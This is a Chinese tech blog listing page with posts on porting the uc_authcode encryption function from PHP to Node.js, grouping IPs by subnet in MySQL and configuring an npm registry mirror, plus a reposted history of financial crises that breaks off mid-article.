<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>第 5 页 | 博客</title>

  
  <meta name="author" content="403 Forbidden">
  

  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content="博客"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="博客" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">博客</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">主页</a></li>
      
        <li><a href="/archives">归档</a></li>
      
        <li><a href="/categories">分类</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2015/12/20/将 func uc_authcode 翻译成了 node 版，留备用/"><span>将 func uc_authcode 翻译成了 node 版，留备用</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/12/20/将 func uc_authcode 翻译成了 node 版，留备用/" rel="bookmark">
        <time class="entry-date published" datetime="2015-12-19T23:55:06.000Z">
          2015-12-20
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>原版 PHP :<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uc_authcode</span><span class="params">($str, $operation = <span class="string">'DECODE'</span>, $key = <span class="string">''</span>, $expiry = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    $ckey_length = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    $key = md5($key);</span><br><span class="line">    $keya = md5(substr($key, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">    $keyb = md5(substr($key, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">    $keyc = $ckey_length ? ($operation == <span class="string">'DECODE'</span> ? substr($str, <span class="number">0</span>, $ckey_length): substr(md5(microtime()), -$ckey_length)) : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    $cryptkey = $keya.md5($keya.$keyc);</span><br><span class="line">    $key_length = strlen($cryptkey);</span><br><span class="line"></span><br><span class="line">    $str = $operation == <span class="string">'DECODE'</span> ? base64_decode(substr($str, $ckey_length)) : sprintf(<span class="string">'%010d'</span>, $expiry ? $expiry + time() : <span class="number">0</span>).substr(md5($str.$keyb), <span class="number">0</span>, <span class="number">16</span>).$str;</span><br><span class="line">    $str_length = strlen($str);</span><br><span class="line"></span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    $box = range(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line"></span><br><span class="line">    $rndkey = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">        $rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($j = $i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">        $j = ($j + $box[$i] + $rndkey[$i]) % <span class="number">256</span>;</span><br><span class="line">        $tmp = $box[$i];</span><br><span class="line">        $box[$i] = $box[$j];</span><br><span class="line">        $box[$j] = $tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($a = $j = $i = <span class="number">0</span>; $i &lt; $str_length; $i++) &#123;</span><br><span class="line">        $a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        $j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">        $tmp = $box[$a];</span><br><span class="line">        $box[$a] = $box[$j];</span><br><span class="line">        $box[$j] = $tmp;</span><br><span class="line">        $result .= chr(ord($str[$i]) ^ ($box[($box[$a] + $box[$j]) % <span class="number">256</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($operation == <span class="string">'DECODE'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>((substr($result, <span class="number">0</span>, <span class="number">10</span>) == <span class="number">0</span> || substr($result, <span class="number">0</span>, <span class="number">10</span>) - time() &gt; <span class="number">0</span>) &amp;&amp; substr($result, <span class="number">10</span>, <span class="number">16</span>) == substr(md5(substr($result, <span class="number">26</span>).$keyb), <span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> substr($result, <span class="number">26</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $keyc.str_replace(<span class="string">'='</span>, <span class="string">''</span>, base64_encode($result));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>node：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Buffer = <span class="built_in">require</span>(<span class="string">"buffer"</span>).Buffer;</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">"crypto"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>.prototype.md5=<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> crypto.createHash(<span class="string">"md5"</span>).update(<span class="keyword">this</span>.toString(),<span class="string">'utf8'</span>).digest(<span class="string">"hex"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> microtime=<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> d=<span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    <span class="keyword">return</span> (d.getMilliseconds()/<span class="number">1000</span>).toFixed(<span class="number">8</span>)+<span class="string">" "</span>+<span class="built_in">Math</span>.floor(d.getTime()/<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> uc_authcode=<span class="function"><span class="keyword">function</span>(<span class="params">str,operation,key,expiry</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> operation=operation || <span class="string">'DECODE'</span>;</span><br><span class="line">    <span class="keyword">var</span> key=key?key.md5():<span class="string">'d41d8cd98f00b204e9800998ecf8427e'</span>;</span><br><span class="line">    <span class="keyword">var</span> expiry=expiry?expiry:<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> ckey_length=<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">var</span> keya=key.substr(<span class="number">0</span>,<span class="number">16</span>).md5();</span><br><span class="line">    <span class="keyword">var</span> keyb=key.substr(<span class="number">16</span>,<span class="number">16</span>).md5();</span><br><span class="line">    <span class="keyword">var</span> keyc=ckey_length ? (operation === <span class="string">'DECODE'</span> ? str.substr(<span class="number">0</span>, ckey_length): microtime().md5().substr(-ckey_length)) : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> cryptkey=keya+(keya+keyc).md5();</span><br><span class="line">    <span class="keyword">var</span> key_length=cryptkey.length;</span><br><span class="line">    str = (operation === <span class="string">'DECODE'</span> ? <span class="keyword">new</span> Buffer(str.substr(ckey_length),<span class="string">'base64'</span>) : ((<span class="string">"000000000"</span>+( expiry ? <span class="built_in">parseInt</span>(expiry) + <span class="built_in">Math</span>.floor(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime()/<span class="number">1000</span>) : <span class="number">0</span>)).substr(<span class="number">-10</span>)+(str+keyb).md5().substr(<span class="number">0</span>, <span class="number">16</span>)+str));</span><br><span class="line">    <span class="keyword">var</span> str_length=str.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> box=[];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        box[i]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> rndkey=[];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; i++) &#123;</span><br><span class="line">        rndkey[i]=cryptkey[i % key_length].charCodeAt();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j=i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        j = (j + box[i] + rndkey[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = box[i];</span><br><span class="line">        box[i] = box[j];</span><br><span class="line">        box[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">new</span> Buffer(str_length);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> a = j = i = <span class="number">0</span>; i &lt; str_length; i++) &#123;</span><br><span class="line">        a = (a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + box[a]) % <span class="number">256</span>;</span><br><span class="line">        tmp = box[a];</span><br><span class="line">        box[a] = box[j];</span><br><span class="line">        box[j] = tmp;</span><br><span class="line">        <span class="keyword">var</span> charcode = operation === <span class="string">'DECODE'</span> ? str[i] ^ (box[(box[a] + box[j]) % <span class="number">256</span>]) : str[i].charCodeAt() ^ (box[(box[a] + box[j]) % <span class="number">256</span>]);</span><br><span class="line">        result[i] = charcode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (operation === <span class="string">'DECODE'</span>) &#123;</span><br><span class="line">        result = result.toString();</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">parseInt</span>(result.substr(<span class="number">0</span>, <span class="number">10</span>)) === <span class="number">0</span> || <span class="built_in">parseInt</span>(result.substr(<span class="number">0</span>, <span class="number">10</span>)) - <span class="built_in">Math</span>.floor(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime()/<span class="number">1000</span>) &gt; <span class="number">0</span>) &amp;&amp; result.substr(<span class="number">10</span>, <span class="number">16</span>) == (result.substr(<span class="number">26</span>)+keyb).md5().substr(<span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> result.substr(<span class="number">26</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (keyc+result.toString(<span class="string">"base64"</span>).replace(<span class="regexp">/=/g</span>,<span class="string">""</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(uc_authcode(<span class="string">"aaaaaa"</span>, <span class="string">'ENCODE'</span>, <span class="string">'testkey'</span>));</span><br><span class="line"><span class="built_in">console</span>.log(uc_authcode(<span class="string">"950ewo3CtcO9wrzCpsKBwrnChQbCgcOPwrJCe1Jow5LCnzJawrvCvcOzwpXDn8OqZcKFwpA8w7LCqg"</span>, <span class="string">'DECODE'</span>, <span class="string">'testkey'</span>));</span><br></pre></td></tr></table></figure></p>
<p>另附一个前端用的：<a href="/uploads/2015/12/js版uc_authcode例子.zip">js版uc_authcode例子</a>，by <a href="http://download.csdn.net/download/zhengshuiguang/8289509" target="_blank" rel="noopener">zhengshuiguang</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/12/20/将 func uc_authcode 翻译成了 node 版，留备用/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/12/16/mysql按照网段分类IP/"><span>mysql按照网段分类IP</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/12/16/mysql按照网段分类IP/" rel="bookmark">
        <time class="entry-date published" datetime="2015-12-16T06:36:18.000Z">
          2015-12-16
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>数据库里面取出来是IP地址，需要用sql来给IP段地址分类<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INET_NTOA</span>(<span class="keyword">CONVERT</span>(<span class="keyword">INET_ATON</span>(<span class="string">'192.168.35.11'</span>),SIGNED)&amp;<span class="number">0xFFFFFF00</span>) <span class="keyword">AS</span> tt</span><br></pre></td></tr></table></figure></p>
<p><a href="/uploads/2015/12/QQ图片20151216223458.png"><img src="/uploads/2015/12/QQ图片20151216223458.png" alt="QQ图片20151216223458"></a></p>
<p>命令解释:</p>
<ol>
<li>inet_aton(‘192.168.35.11’)这个函数是将IP地址转化为一个序列. </li>
</ol>
<ol start="2">
<li>convert是将序列类型定义成整数. </li>
</ol>
<ol start="3">
<li>&amp;0xFFFFFF00的意思是与FFFFFF00这个16进制数进行与操作.这步操作相当于掩码.可以过滤网段. </li>
</ol>
<ol start="4">
<li>inet_ntoa这个函数是将整理好的序列转化成IP地址的形式.</li>
</ol>
<p>转载自 <a href="http://blog.csdn.net/a105421548/article/details/45224843" target="_blank" rel="noopener">http://blog.csdn.net/a105421548/article/details/45224843</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/12/16/mysql按照网段分类IP/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/12/15/使用npm安装一些包失败了的看过来（npm国内镜像介绍）/"><span>使用npm安装一些包失败了的看过来（npm国内镜像介绍）</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/12/15/使用npm安装一些包失败了的看过来（npm国内镜像介绍）/" rel="bookmark">
        <time class="entry-date published" datetime="2015-12-15T08:00:29.000Z">
          2015-12-15
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>这个也是网上搜的，亲自试过，非常好用！<br>镜像使用方法（三种办法任意一种都能解决问题，建议使用第三种，将配置写死，下次用的时候配置还在）:</p>
<p>1.通过config命令<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org </span><br><span class="line">npm info underscore #如果上面配置正确这个命令会有字符串response</span><br></pre></td></tr></table></figure></p>
<p>2.命令行指定<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm --registry https://registry.npm.taobao.org info underscore</span><br></pre></td></tr></table></figure></p>
<p>3.编辑 ~/.npmrc 加入下面内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">registry = https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure></p>
<p>搜索镜像: <a href="https://npm.taobao.org" target="_blank" rel="noopener">https://npm.taobao.org</a><br>建立或使用镜像,参考: <a href="https://github.com/cnpm/cnpmjs.org" target="_blank" rel="noopener">https://github.com/cnpm/cnpmjs.org</a></p>
<p>转载自 <a href="https://cnodejs.org/topic/4f9904f9407edba21468f31e" target="_blank" rel="noopener">https://cnodejs.org/topic/4f9904f9407edba21468f31e</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/12/15/使用npm安装一些包失败了的看过来（npm国内镜像介绍）/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/12/02/历史上的金融危机都是怎么发生的/"><span>历史上的金融危机都是怎么发生的</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/12/02/历史上的金融危机都是怎么发生的/" rel="bookmark">
        <time class="entry-date published" datetime="2015-12-02T07:57:53.000Z">
          2015-12-02
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>　　在刚刚过去的一周，全球股市经历了2008年金融危机以来最黑暗的一周。<br>　　新兴市场股市今年已下跌15%，多个国家货币兑美元创多年来新低，货币贬值幅度在3%以上的新兴市场经济体高达17个。过去两个半月，A股指数下跌了32%，恒指下跌了21%。上周，上证综指和深证综指均跌近12%。继亚洲股市遭遇重挫后，上周五欧美股市也遭抛售。<br>　　一个全新的词汇在资本市场传播：capitulation，翻译成中文叫“投降式抛售”。这种“不做任何抵抗，连就地卧倒装死的敷衍动作都懒得做的直接缴械投降”，有点像2008年的美国金融危机，但更多的观点认为像1997年-1998年的亚洲金融危机。<br>　　全球金融危机的言论再起，那么世界范围内，都发生过哪些大的金融危机呢？下面小编为您一一盘点。<br>自17世纪以来，全球范围内发生了九次波及范围巨大影响深远的金融危机，这些危机发生时都给社会经济运行造成了巨大混乱，并对后世产生了深远影响。<br>　　自17世纪以来，全球范围内发生了九次波及范围巨大影响深远的金融危机，这些危机发生时都给社会经济运行造成了巨大混乱，并对后世产生了深远影响。<br><a href="/uploads/2015/12/178587953.jpg"><img src="/uploads/2015/12/178587953.jpg" alt="178587953"></a><br><strong>一、1637年荷兰郁金香危机</strong><br>　　1593年，一位荷兰商人格纳从土耳其进口首株郁金香，由于这种花是进口货，因此拥有郁金香花便成为有钱人的符号。<br>　　开始只有郁金香的行家才懂得欣赏郁金香之美，但在形成风潮后，投机客便趁机炒作，只要今天买了，明天就可赚一笔。买的人多了，交易市场也就形成了，交易场所也逐渐热闹起来。<br>　　1634年，买郁金香的热潮蔓延到中产阶级，更蔓延为全民运动，大家都来买卖郁金香了，炒家只看到买低卖高，利润就进来，于是全民都变成郁金香的炒家。<br>　　1000美元一朵郁金香花根，不到一个月之后，它就变成两万美元了。<br>　　到了1636年，郁金香在阿姆斯特丹及鹿特丹股市上市。这时，一朵郁金香花根售价相当于今天的76000美元，比一部汽车还贵。<br>　　这是有名的郁金香花根泡沫。<br>　　此时，荷兰政府开始采取刹车的行动，而由土耳其运来的郁金香也大量抵达，郁金香不再那么稀罕，于是一瞬间郁金香的价格往下滑，6个星期内竟然下跌了90%，荷兰政府宣布这一事件为赌博事件，结束这一场疯狂的郁金香泡沫事件。这就是有记录的历史上第一次经济泡沫事件。<br><a href="/uploads/2015/12/178587954.jpg"><img src="/uploads/2015/12/178587954.jpg" alt="178587954"></a><br><strong>二、1720年英国南海泡沫事件</strong><br>　　南海泡沫事件(South Sea Bubble)是英国在1720年春天到秋天之间发生的一次经济泡沫，事件起因源于南海公司(South Sea Company)，南海公司在1711年西班牙王位继承战争仍然进行时创立，它表面上是一间专营英国与南美洲等地贸易的特许公司，但实际上是一所协助政府融资的私人机构，分担政府因战争而欠下的债务。<br>　　南海公司在夸大业务前景及进行舞弊的情况下被外界看好，到1720年，南海公司更透过贿赂政府，向国会推出以南海股票换取国债的计划，促使南海公司股票大受追捧，股价由原本1720年年初约120英镑急升至同年7月的1,000镑以上，全民疯狂炒股。<br>　　然而，市场上随即出现不少“泡沫公司”混水摸鱼，试图趁南海股价上升的同时分一杯羹。为规管这些不法公司的出现，国会在6月通过《泡沫法案》，炒股热潮随之减退，并连带触发南海公司股价急挫，至9月暴跌回190镑以下的水平，不少人血本无归，连著名物理学家牛顿爵士也蚀本离场。<br>　　南海泡沫事件使大众对政府诚信破产，多名托利党官员因事件下台或问罪；相反，辉格党政治家罗伯特-沃波尔在事件中成功收拾混乱，协助向股民作出赔偿，使经济恢复正常，从而在1721年取得政府实权，并被后世形容为英国历史上的首位首相，此后，辉格党取代托利党，长年主导了英国的政局。<br><a href="/uploads/2015/12/178587955.jpg"><img src="/uploads/2015/12/178587955.jpg" alt="178587955"></a><br><strong>三、1837年美国金融恐慌</strong><br>　　19世纪早期的美国联邦政府没有自己的中央银行，因此也没有发行纸币。<br>　　第二合众国银行由国会在1816年授权建立，它创立了统一的国家货币，一度成为美国最大最好的钞票的发行者，创立了单一的汇率等。它实力强大，它的资本比美国政府的财政支出多出一倍，拥有全国20%的货币流通量，在各州设立了29个分行，控制着各州的金融。<br>　　考虑到许多州银行立法很仓促，经营不善，普遍资本金不足，监管不严，对未来过度乐观，第二合众国银行通过拒绝接受它认为经营不善的银行的票据来维护它自身的稳定。这削弱了公众对第二合众国银行的信心。<br>　　1829年，杰克逊当选为美国总统，他认为第二合众国银行的信贷问题影响了美国经济的发展。杰克逊决定关闭第二合众国银行。作为毁掉合众国银行的策略的一部分，杰克逊从该银行撤出了政府存款，转而存放在州立银行，没想到，危机竟然就此产生。<br>　　因为增加了存款基础，不重视授信政策的州立银行可以发行更多的银行券，并以房地产作担保发放了更多的贷款，而房地产是所有投资中最缺乏流动性的一种。这样一来，最痛恨投机和纸币的杰克逊总统所实施的政策，意想不到地引发了美国首次由于纸币而引起的巨大投机泡沫。<br>　　这场恐慌带来的经济萧条一直持续到1843年。恐慌的原因是多方面的：贵金属由联邦政府向州银行的转移，分散了储备，妨碍了集中管理；英国银行方面的压力；储备分散所导致的稳定美国经济机制的缺失等等。<br><a href="/uploads/2015/12/178587956.jpg"><img src="/uploads/2015/12/178587956.jpg" alt="178587956"></a><br><strong>四、1907年美国银行业危机</strong><br>　　1907年，美国银行业投机盛行，纽约一半左右的银行贷款都被高利息回报的信托投资公司作为抵押投在高风险的股市和债券上，整个金融市场陷入极度投机状态。<br>　　当年10月，美国第三大信托公司尼克伯克信托公司(Knickerbocker Trust)大肆举债，在股市上收购联合铜业公司(United Copper)股票，但此举失利，引发了华尔街的大恐慌和关于尼克伯克即将破产的传言。导致该银行客户疯狂挤兑，并引发华尔街金融危机。银行要求收回贷款，股价一落千丈。<br>　　时任摩根财团总裁的约翰-皮尔庞特-摩根联合其他银行共同出手，筹集流动资金，才使市场重归平静。很快，美国财政部长乔治·科特留宣布，政府动用3500万美元资金参加救市。随后，市场恢复正常。此次救市导致了1914年美国联邦储备系统的诞生，金融体系的稳定性得以增强。<br><a href="/uploads/2015/12/178587957.jpg"><img src="/uploads/2015/12/178587957.jpg" alt="178587957"></a><br><strong>五、1929年美国股市大崩盘</strong><br>　　1929年10月，美国纽约市场出现了抛售股票浪潮，股票价格大幅度下跌。<br>　　到10月24日，举国上下谣言四起造成金融不稳，被吓坏了的投资者命令经纪人抛售股票，导致美国股市崩溃。<br>　　10月29日，纽约证券交易所里所有的人都陷入了抛售股票的漩涡之中。股指从之前的363最高点骤然下跌了平均40%。这是美国证券史上最黑暗的一天，是美国历史上影响最大、危害最深的经济事件，影响波及整个世界。<br>　　此后，美国和全球进入了长达10年的经济大萧条时期。引发美国股市大崩盘的1929年9-10月，被后来者形容为“屠杀百万富翁的日子”，并且“把未来都吃掉了”。<br>　　在危机发生后的4年内，美国国内生产总值下降了30%，投资减少了80%，1500万人失业。<br><a href="/uploads/2015/12/178587958.jpg"><img src="/uploads/2015/12/178587958.jpg" alt="178587958"></a><br><strong>六、1987年席卷全球股市的黑色星期一</strong><br>　　1987年10月19日星期一美国股市出现惊人下跌并引发世界其他国家股票市场跟风下跌。<br>　　道琼斯工业股票平均指数骤跌508点，下跌幅度22%，一天内跌去的股票价值总额令人目瞪口呆——是1929年华尔街大崩溃时跌去价值总额的两倍。混乱中，价值超过6亿美元的股票被抛售。<br>　　纽约股市的震荡也在东京和伦敦造成了混乱。伦敦的FT指数滑落25O点，威胁到政府对英国石油股份公司的私有化的进程。日经指数下跌202.32点，收于9097.56点，跌幅为2.18%。<br>　　很多人在股灾后感到奇怪，因当日根本没有任何不利股市的消息或新闻，因此下跌看似并无实在的原因，令当时很多人怀疑是羊群心理、市场失败(efficient market hypothesis)或经济失衡引致股灾，至今仍在争论。<br><a href="/uploads/2015/12/178587959.jpg"><img src="/uploads/2015/12/178587959.jpg" alt="178587959"></a><br><strong>七、1995年墨西哥金融危机</strong><br>　　1994年12月19日深夜，墨西哥政府突然对外宣布，本国货币比索贬值15%。这一决定在市场上引起极大恐慌。外国投资者疯狂抛售比索，抢购美元，比索汇率急剧下跌。<br>　　12月20日汇率从最初的3.47比索兑换l美元跌至3.925比索兑换l美元，狂跌13%。<br>　　21日再跌15.3%。伴随比索贬值，外国投资者大量撤走资金，墨西哥外汇储备在20日至21日两天锐减近40亿美元。墨西哥整个金融市场一片混乱。<br>　　从20日至22日，短短的三天时间，墨西哥比索兑换美元的汇价就暴跌了42.17%，这在现代金融史上是极其罕见的。<br>　　墨西哥吸收的外资，有70%左右是投机性的短期证券投资。资本外流对于墨西哥股市如同釜底抽薪，墨西哥股市应声下跌。<br>　　12月30日，墨西哥IPC指数跌6.26%。<br>　　1995年1月10日更是狂跌11%。<br>　　到3月3日，墨西哥股市IPC指数已跌至1500点，比1994年金融危机前最高点2881.17点已累计跌去了47.94%，股市下跌幅度超过了比索贬值的幅度。<br>　　这场金融危机震撼全球，危害极大，影响深远。<br><a href="/uploads/2015/12/178587960.jpg"><img src="/uploads/2015/12/178587960.jpg" alt="178587960"></a><br><strong>八、1997年亚洲金融危机</strong><br>　　1997年7月2日，泰国宣布放弃固定汇率制，实行浮动汇率制，引发一场遍及东南亚的金融风暴。当天，泰铢兑换美元的汇率下降了17%，外汇及其他金融市场一片混乱。<br>　　在泰铢波动的影响下，菲律宾比索、印度尼西亚盾、马来西亚林吉特相继成为国际炒家的攻击对象。<br>　　8月，马来西亚放弃保卫林吉特的努力。一向坚挺的新加坡元也受到冲击。印尼虽是受“传染”最晚的国家，但受到的冲击最为严重。<br>　　10月下旬，国际炒家移师国际金融中心香港，矛头直指香港联系汇率制。台湾当局突然弃守新台币汇率，一天贬值3.46%，加大了对港币和香港股市的压力。<br>　　10月23日，香港恒生指数大跌1211.47点；28日，下跌1 